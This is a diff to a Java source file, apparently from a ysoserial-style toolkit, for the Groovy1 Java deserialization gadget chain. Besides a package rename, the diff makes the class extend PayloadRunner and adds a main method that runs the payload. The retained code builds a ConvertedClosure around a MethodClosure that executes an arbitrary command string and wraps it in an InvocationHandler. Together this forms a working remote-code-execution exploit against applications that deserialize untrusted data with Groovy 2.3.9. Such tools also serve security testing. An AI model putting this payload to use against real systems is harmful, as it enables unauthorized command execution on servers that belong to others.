@@ -3,13 +3,14 @@ package A.R.ysogate.payloads.gadgets;
 import java.lang.reflect.InvocationHandler;
 import java.util.Map;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.codehaus.groovy.runtime.ConvertedClosure;
 import org.codehaus.groovy.runtime.MethodClosure;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
+import A.R.ysogate.payloads.utils.Gadgets;
 
 /*
 	Gadget chain:
@@ -28,7 +29,7 @@ import A.R.ysogate.payloads.util.Gadgets;
 
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
 @Authors({Authors.FROHOFF})
-public class Groovy1 implements ObjectPayload<InvocationHandler> {
+public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
 	public InvocationHandler getObject(final String command) throws Exception {
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
@@ -38,5 +39,9 @@ public class Groovy1 implements ObjectPayload<InvocationHandler> {
 		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
 
 		return handler;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Groovy1.class, args);
 	}
 }
